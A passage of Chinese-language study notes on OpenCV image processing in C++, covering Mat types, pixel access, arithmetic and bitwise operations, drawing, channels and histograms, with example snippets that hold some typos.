class="markdownIt-Anchor" href="#傅里叶幅度谱与相位谱"></a> 傅里叶幅度谱与相位谱</h2><h2 id="普残差显著性监测"><a class="markdownIt-Anchor" href="#普残差显著性监测"></a> 普残差显著性监测</h2><h2 id="卷积与傅里叶变换"><a class="markdownIt-Anchor" href="#卷积与傅里叶变换"></a> 卷积与傅里叶变换</h2><h2 id="通过傅里叶快速变换计算卷积"><a class="markdownIt-Anchor" href="#通过傅里叶快速变换计算卷积"></a> 通过傅里叶快速变换计算卷积</h2><h1 id="图像数字化"><a class="markdownIt-Anchor" href="#图像数字化"></a> 图像数字化</h1><h2 id="numpy的ndarry"><a class="markdownIt-Anchor" href="#numpy的ndarry"></a> numpy的ndarry</h2><h2 id="mat类"><a class="markdownIt-Anchor" href="#mat类"></a> Mat类</h2><h3 id="属性"><a class="markdownIt-Anchor" href="#属性"></a> 属性</h3><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>cols</td><td>列数，图像宽度</td></tr><tr><td>rows</td><td>行数，图像高度</td></tr><tr><td>channels()</td><td>通道数</td></tr><tr><td>depth()</td><td>深度</td></tr><tr><td>type()</td><td>图像类型枚举</td></tr></tbody></table><h3 id="图像类型枚举"><a class="markdownIt-Anchor" href="#图像类型枚举"></a> 图像类型枚举</h3><ul><li>图像深度</li></ul><table><thead><tr><th>图像深度</th><th>说明</th></tr></thead><tbody><tr><td>CV_8U</td><td>8位无符号(字节)类型</td></tr><tr><td>CV_8S</td><td>8位有符号(字节)类型</td></tr><tr><td>CV_16U</td><td>16位无符号类型</td></tr><tr><td>CV_16S</td><td>16位有符号类型</td></tr><tr><td>CV_32S</td><td>32位有符号整型类型</td></tr><tr><td>CV_32F</td><td>32位浮点类型</td></tr><tr><td>CV_64F</td><td>32位双精度类型</td></tr></tbody></table><ul><li>图像通道</li></ul><table><thead><tr><th>通道</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>C1</td><td>单通道</td><td>CV_8UC1</td></tr><tr><td>C2</td><td>双通道</td><td>CV_8UC2</td></tr><tr><td>C3</td><td>三通道</td><td>CV_8UC3</td></tr><tr><td>C4</td><td>四通道</td><td>CV_8UC4</td></tr></tbody></table><h3 id="创建mat"><a class="markdownIt-Anchor" href="#创建mat"></a> 创建Mat</h3><table><thead><tr><th>功能</th><th>代码</th><th>说明</th></tr></thead><tbody><tr><td>空白Mat对象</td><td><code>Mat t1 = Mat(256,256,CV_8UC1);t1.Scalar(0);</code><br><code>Mat t2 = Mat(256,256,CV_8UC3);t2.Scalar(0,0,0);</code><br><code>Mat t3 = Mat(Size(256,256),CV_8UC1);t3.Scalar(0);</code><br><code>Mat t4 = Mat::Zero(Size(256,256),CV_8UC1);</code><br></td><td></td></tr><tr><td>从现有图像创建</td><td><code>Mat t1 = src;//指针</code><br><code>Mat t2 = src.clone();//拷贝</code><br><code>Mat t3; src.copyTo(t3);</code><br><code>Mat t4 = Mat::zero(src.size(),src.type());</code></td><td></td></tr><tr><td>创建有填充值的</td><td>scalar函数可以填充内容</td><td></td></tr><tr><td>创建单通道和多通道</td><td>在创建对象时设定mat的类型</td><td></td></tr></tbody></table><h3 id="遍历与访问像素值"><a class="markdownIt-Anchor" href="#遍历与访问像素值"></a> 遍历与访问像素值</h3><ul><li>基于数组的遍历</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;src.rows;row++)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;src.cols;col++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (src.channels()==<span class="number">3</span>)&#123;</span><br><span class="line">      Vec3b pixel = src.at&lt;Vec3b&gt;(row,col);</span><br><span class="line">      <span class="keyword">int</span> blue=pixel[<span class="number">0</span>],green=pixel[<span class="number">1</span>],red=pixel[<span class="number">2</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(src.channels()==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">int</span> pv=src.at&lt;uchar&gt;(row,col);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>基于指针的遍历</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;src.rows;row++)&#123;</span><br><span class="line">  unchar* curr_row = src.ptr&lt;unchar&gt;(row);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;src.cols;col++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (src.channels()==<span class="number">3</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> blue = *curr_row++;</span><br><span class="line">      <span class="keyword">int</span> green = *curr_row++;</span><br><span class="line">      <span class="keyword">int</span> red = *curr_row++ ;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(src.channels()==<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> pv = *curr_row++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="opencv的vec类"><a class="markdownIt-Anchor" href="#opencv的vec类"></a> opencv的Vec类</h3><ul><li>OpenCV中的向量模板类，具体有Vec2b，Vec2s，Vec3b，Vec3s，Vec3i，Vec3f等</li></ul><table><thead><tr><th>符号</th><th>定义</th><th>说明</th></tr></thead><tbody><tr><td>Vec3b</td><td><code>typedef Vec&lt;uchar,3&gt; Vec3b;</code></td><td>Vec3b就是有3个uchar类型元素的向量</td></tr><tr><td>Vec3s</td><td><code>typedef Vec&lt;short,3&gt; Vec3s;</code></td><td>Vec3s就是有3个short int(短整型)类型元素的向量</td></tr></tbody></table><h2 id="矩阵运算"><a class="markdownIt-Anchor" href="#矩阵运算"></a> 矩阵运算</h2><h2 id="图像算术操作"><a class="markdownIt-Anchor" href="#图像算术操作"></a> 图像算术操作</h2><ul><li>在对输入图像进行加减乘除操作时，需要保证两个操作矩阵的大小、类型一致。</li><li>unchar加减乘除的越界处理。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>Mat add(src1,src2)</td><td>加</td><td></td></tr><tr><td>Mat subtract(src1,src2)</td><td>减</td><td></td></tr><tr><td>Mat multiply(src1,src2)</td><td>乘</td><td></td></tr><tr><td>Mat divide(src1,src2)</td><td>除</td><td></td></tr><tr><td>void addWeighted(src1,weight1,src2,weight2,base,dst)</td><td>两个图片分别乘以系数相加，可以通过提高系数增加对比度</td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src1 = imread(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">Mat src2 = imread(<span class="string">&quot;./2.jpg&quot;</span>);</span><br><span class="line">Mat dst1 = add(src1,src2);</span><br><span class="line">Mat dst2 = subtract(src1,src2);</span><br><span class="line">Mat dst3 = multiply(src1,src2);</span><br><span class="line">Mat dst4 = divide(src1,src2);</span><br><span class="line">Mat dst5; addWeighted(src1,<span class="number">1.2</span>,src2,<span class="number">0.5</span>,<span class="number">0.0</span>,dst5);</span><br></pre></td></tr></table></figure><h2 id="图像位操作"><a class="markdownIt-Anchor" href="#图像位操作"></a> 图像位操作</h2><ul><li>未操作包含了：与或非异或。</li><li>通常使用图片未操作的效率更高。</li><li>位操作中还可以根据mask非零区域进行局部处理，mask通道数必须是1。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>bitwise_not(src,dst,mask)</td><td>非</td><td></td></tr><tr><td>bitwise_and(src1,src2,dst,mask)</td><td>与</td><td></td></tr><tr><td>bitwise_or(src1,src2,dst,mask)</td><td>或</td><td></td></tr><tr><td>bitwise_xor(src1,src2,dst,mask)</td><td>异或</td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">Mat mask = Mat::zeros(src.size(),CV_8UC1);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;src.rows;row++)</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;src.cols;col++)</span><br><span class="line">    mask.at&lt;unchar&gt;(row,col)=<span class="number">255</span>;</span><br><span class="line">Mat dst1; bitwise_not(src,dst1,Mat());</span><br><span class="line">Mat dst2; bitwise_and(src,src,dst1,Mat());</span><br><span class="line">Mat dst3; bitwise_or(src,src,dst1,Mat());</span><br><span class="line">Mat dst4; bitwise_xor(src,src,dst1,Mat());</span><br></pre></td></tr></table></figure><h2 id="像素信息统计"><a class="markdownIt-Anchor" href="#像素信息统计"></a> 像素信息统计</h2><ul><li>图像最大值、最小值、均值、方差、直方图：像素分布</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>void minMaxLoc(src,double &amp;min,double &amp;max,Point &amp;minloc,Point &amp;maxloc)</td><td>获取最大最小值和位置，src必须是单通道的</td><td></td></tr><tr><td>Scalar mean(src)</td><td>均值，返回每个通道的均值</td><td></td></tr><tr><td>void meanStdDev(src,meanMat,stdMat)</td><td>均值和方差</td><td></td></tr></tbody></table><ul><li>均值和方差</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line"><span class="keyword">double</span> xmin,xmax;Point xminloc,xmaxloc;</span><br><span class="line">minMaxLoc(src,&amp;xmin,&amp;xmax,&amp;xminloc,&amp;xmaxloc);</span><br><span class="line">src = imread(<span class="string">&quot;./1.jpg&quot;</span>);</span><br><span class="line">Scalar s = mean(src);</span><br><span class="line">Mat xmean,mstd;</span><br><span class="line">meanStdDev(src,xmean,mstd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stddev:%2.f,%2.f,%2.f&quot;</span>,mstd.at&lt;<span class="keyword">double</span>&gt;(<span class="number">0</span>,<span class="number">0</span>),mstd.at&lt;<span class="keyword">double</span>&gt;(<span class="number">1</span>,<span class="number">0</span>),mstd.at&lt;<span class="keyword">double</span>&gt;(<span class="number">2</span>,<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>像素值统计-直方图</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;hist(<span class="number">256</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">  hist[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;src.rows;row++)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;src.cols;col++)&#123;</span><br><span class="line">    <span class="keyword">int</span> pv = src.at&lt;unchar&gt;(row,col)</span><br><span class="line">    hist[pv]++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图像绘制与填充"><a class="markdownIt-Anchor" href="#图像绘制与填充"></a> 图像绘制与填充</h2><ul><li>点、线、矩形、圆、椭圆、多边形、文字</li><li>当设置线宽值小于零，opencv会自动填充区域。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>line(src,Piont,Point,Scalar color,int lineWeight,int lineType)</td><td></td><td></td></tr><tr><td>rectangle(src,Rect,Scalar color,int lineWeight,int lineType)</td><td></td><td></td></tr><tr><td>circle(src,Piont,int radius,Scalar color,int lineWeight,int lineType)</td><td></td><td></td></tr><tr><td>ellipse(src,RotatedRect,Scalar color,int lineWeight,int lineType)</td><td></td><td></td></tr><tr><td>putText(src,string,Point,int fontFace,double scale,Scalar color,int lineThickness,int lineType)</td><td></td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat canvas=Mat::zeros(Size(<span class="number">512</span>,<span class="number">512</span>),CV_8UC3);</span><br><span class="line">line(canvas,Point(<span class="number">10</span>,<span class="number">10</span>),Point(<span class="number">20</span>,<span class="number">123</span>),Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),LINE_8);</span><br><span class="line"><span class="function">Rect <span class="title">rect</span><span class="params">(<span class="number">100</span>,<span class="number">100</span>,<span class="number">200</span>,<span class="number">200</span>)</span></span>;</span><br><span class="line">rectangle(canvas,rect,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">circle(canvas,Piont(<span class="number">255</span>,<span class="number">255</span>),<span class="number">100</span>,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">RotatedRect rt;</span><br><span class="line">rt.center = Point(<span class="number">256</span>,<span class="number">256</span>);</span><br><span class="line">rt.angle = <span class="number">45</span>;  <span class="comment">// 椭圆的旋转角度</span></span><br><span class="line">rt.size = Size(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">ellipse(canvas,rt,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">-1</span>,<span class="number">8</span>);</span><br><span class="line">putText(canvas,<span class="string">&quot;hello&quot;</span>,Point(<span class="number">100</span>,<span class="number">50</span>),FONT_HERSHEY_SIMPLEX,<span class="number">1.0</span>,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">imshow(<span class="string">&quot;canvas&quot;</span>,canvas);</span><br></pre></td></tr></table></figure><ul><li>随机绘制</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat canvas=Mat::zeros(Size(<span class="number">512</span>,<span class="number">512</span>),CV_8UC3);</span><br><span class="line"><span class="keyword">int</span> x1=<span class="number">0</span>,x2=<span class="number">0</span>,y1=<span class="number">0</span>,y2=<span class="number">0</span>;</span><br><span class="line"><span class="function">RNG <span class="title">rng</span><span class="params">(<span class="number">12345</span>)</span></span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">  x1 = (<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">512</span>);</span><br><span class="line">  x2 = (<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">512</span>);</span><br><span class="line">  y1 = (<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">512</span>);</span><br><span class="line">  y2 = (<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">512</span>);</span><br><span class="line">  Scalar color = Scalar((<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">256</span>),(<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">512</span>),(<span class="keyword">int</span>)rng.uniform(<span class="number">0</span>,<span class="number">512</span>));</span><br><span class="line">  <span class="keyword">int</span> lineWeight = (<span class="keyword">int</span>)rng.uniform(<span class="number">1</span>,<span class="number">20</span>);</span><br><span class="line">  line(canvas,Point(x1,y1),Point(x2,y2),color,lineWeight,LINE_8);</span><br><span class="line">  imshow(<span class="string">&quot;canvas&quot;</span>,canvas);</span><br><span class="line">  <span class="comment">//canvas = Scalar(0,0,0); //清空画布</span></span><br><span class="line">  <span class="keyword">char</span> c = waitKey(<span class="number">10</span>); <span class="comment">//等待0.01秒</span></span><br><span class="line">  <span class="keyword">if</span>(c==<span class="number">27</span>)&#123;  <span class="comment">// esc</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图像通道"><a class="markdownIt-Anchor" href="#图像通道"></a> 图像通道</h2><ul><li>通道分离合并</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>split(src,Vector<mat>)</td><td></td><td></td></tr><tr><td>merge(Vector<mat>,dst)</td><td></td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分离</span></span><br><span class="line"><span class="function"><span class="built_in">vector</span>&lt;Mat&gt; <span class="title">rgbCh</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">split(src, rgbCh);</span><br><span class="line">Mat blue=rgbCh[<span class="number">0</span>],green=rgbCh[<span class="number">1</span>],red=rgbCh[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//合并</span></span><br><span class="line">Mat dst;<span class="built_in">vector</span>&lt;Mat&gt; merge_src;</span><br><span class="line">merge_src.push_back(blue);merge_src.push_back(green);merge_src.push_back(red); <span class="comment">//根据bgr的顺序</span></span><br><span class="line">merge(merge_src,dst);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line"><span class="keyword">if</span>(src.empty())<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;Mat&gt; rgbCh;split(src, rgbCh);</span><br><span class="line">rgbCh[<span class="number">0</span>] = Scalar(<span class="number">0</span>);  <span class="comment">//去除了蓝色</span></span><br><span class="line">bitwise_not(rgbCh[<span class="number">1</span>],rgbCh[<span class="number">1</span>]); <span class="comment">//绿色取反</span></span><br><span class="line">Mat dst;</span><br><span class="line">merge(rgbCh,dst);</span><br><span class="line">imshow(<span class="string">&quot;merge&quot;</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="截取兴趣域"><a class="markdownIt-Anchor" href="#截取兴趣域"></a> 截取兴趣域</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line">Rect roi;roi.x=<span class="number">100</span>,roi.y=<span class="number">100</span>,roi.width=<span class="number">200</span>;roi.height=<span class="number">200</span>;</span><br><span class="line">Mat dst = src(roi).clone()  <span class="comment">//不克隆的话，兴趣域指向同一块地址</span></span><br><span class="line">rectangle(src,roi,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">imshow(<span class="string">&quot;src&quot;</span>,src);</span><br><span class="line">imshow(<span class="string">&quot;dst&quot;</span>,dst);</span><br><span class="line">waitKey(<span class="number">0</span>);destroyAllWindows();</span><br></pre></td></tr></table></figure><h1 id="集合变换"><a class="markdownIt-Anchor" href="#集合变换"></a> 集合变换</h1><h2 id="仿射变换"><a class="markdownIt-Anchor" href="#仿射变换"></a> 仿射变换</h2><h2 id="投影变换"><a class="markdownIt-Anchor" href="#投影变换"></a> 投影变换</h2><h2 id="极坐标变换"><a class="markdownIt-Anchor" href="#极坐标变换"></a> 极坐标变换</h2><h1 id="对比度增强"><a class="markdownIt-Anchor" href="#对比度增强"></a> 对比度增强</h1><h2 id="直方图"><a class="markdownIt-Anchor" href="#直方图"></a> 直方图</h2><ul><li>统计与显示：对于CV_8UC1的灰度图像，像素的取值范围是0<sub>255，假使统计范围个数bin=16，每个bin的范围0</sub>15。直方图展示的就是符合每个bin的像素个数。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>calcHist()</td><td>计算直方图</td><td></td></tr><tr><td>normalize(src,dst,)</td><td>归一化</td><td></td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat src = imread(<span class="string">&quot;./1.jpg&quot;</span>,IMREAD_GRAYSCALE);</span><br><span class="line"><span class="keyword">if</span>(src.empty())<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;Mat&gt; rgbCh;split(src, rgbCh);</span><br><span class="line">Mat blue=rgbCh[<span class="number">0</span>],green=rgbCh[<span class="number">1</span>],red=rgbCh[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//计算直方图</span></span><br><span class="line">Mat hist_b,hist_g,hist_r;</span><br><span class="line">calcHist(&amp;blue,<span class="number">1</span>,<span class="number">0</span>,Mat(),hist_b,<span class="number">1</span>,<span class="number">256</span>,&#123;<span class="keyword">float</span>[]&#123;<span class="number">0</span>,<span class="number">255</span>&#125;&#125;,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line">calcHist(&amp;green,<span class="number">1</span>,<span class="number">0</span>,Mat(),hist_g,<span class="number">1</span>,<span class="number">256</span>,&#123;<span class="keyword">float</span>[]&#123;<span class="number">0</span>,<span class="number">255</span>&#125;&#125;,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line">calcHist(&amp;red,<span class="number">1</span>,<span class="number">0</span>,Mat(),hist,hist_r,<span class="number">256</span>,&#123;<span class="keyword">float</span>[]&#123;<span class="number">0</span>,<span class="number">255</span>&#125;&#125;,<span class="literal">true</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//绘制直方图</span></span><br><span class="line"><span class="comment">//将获取的结果归一化</span></span><br><span class="line">Mat HistShow = Mat::zeros(Size(<span class="number">600</span>,<span class="number">400</span>),CV_8UC3);</span><br><span class="line"><span class="keyword">int</span> margin=<span class="number">50</span>;</span><br><span class="line">normalize(hist_b,hist_b,<span class="number">0</span>,HistShow<span class="number">-2</span>*margin,NORM_MINMAX,<span class="number">-1</span>,Mat());</span><br><span class="line">normalize(hist_g,hist_b,<span class="number">0</span>,HistShow<span class="number">-2</span>*margin,NORM_MINMAX,<span class="number">-1</span>,Mat());</span><br><span class="line">normalize(hist_r,hist_b,<span class="number">0</span>,HistShow<span class="number">-2</span>*margin,NORM_MINMAX,<span class="number">-1</span>,Mat());</span><br><span class="line"><span class="comment">//绘制</span></span><br><span class="line"><span class="keyword">float</span> step = (HistShow<span class="number">-2</span>*margin)/<span class="number">256.0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">255</span>;i++)&#123;</span><br><span class="line">  <span class="keyword">float</span> bh1 = hist_b.at&lt;<span class="keyword">float</span>&gt;(i,<span class="number">0</span>),bh2 = hist_b.at&lt;<span class="keyword">float</span>&gt;(i+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">float</span> gh1 = hist_b.at&lt;<span class="keyword">float</span>&gt;(i,<span class="number">0</span>),gh2 = hist_b.at&lt;<span class="keyword">float</span>&gt;(i+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">float</span> rh1 = hist_b.at&lt;<span class="keyword">float</span>&gt;(i,<span class="number">0</span>),rh2 = hist_b.at&lt;<span class="keyword">float</span>&gt;(i+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">  line(HistShow,Point(step*i,<span class="number">50</span>+nm-bh1),Point(step*i,<span class="number">50</span>+nm-bh2),Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  line(HistShow,Point(step*i,<span class="number">50</span>+nm-gh1),Point(step*i,<span class="number">50</span>+nm-gh2),Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  line(HistShow,Point(step*i,<span class="number">50</span>+nm-rh1),Point(step*i,<span class="number">50</span>+nm-rh2),Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">1</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">imshow(<span class="string">&quot;HistShow&quot;</span>,HistShow);</span><br><span class="line">waitKey(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="直方图均衡化"><a class="markdownIt-Anchor" href="#直方图均衡化"></a> 直方图均衡化</h2><ul><li>直方图均衡化后的图像会有比较好的显示效果，暗部变量，举例：64*64大小的图像，8个bin，像素总数4096</li></ul><table><thead><tr><th>k</th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>r</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">r_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><msub><mi>n</mi><mi>k</mi></msub><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{n_k}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.062252em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.717252em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.41586em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>S</mi><mi>k</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mi>k</mi></msubsup><mfrac><msub><mi>n</mi><mi>j</mi></msub><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex">S_k=\sum_{j=0}^{k}{\frac{n_j}{n}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.424826em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" 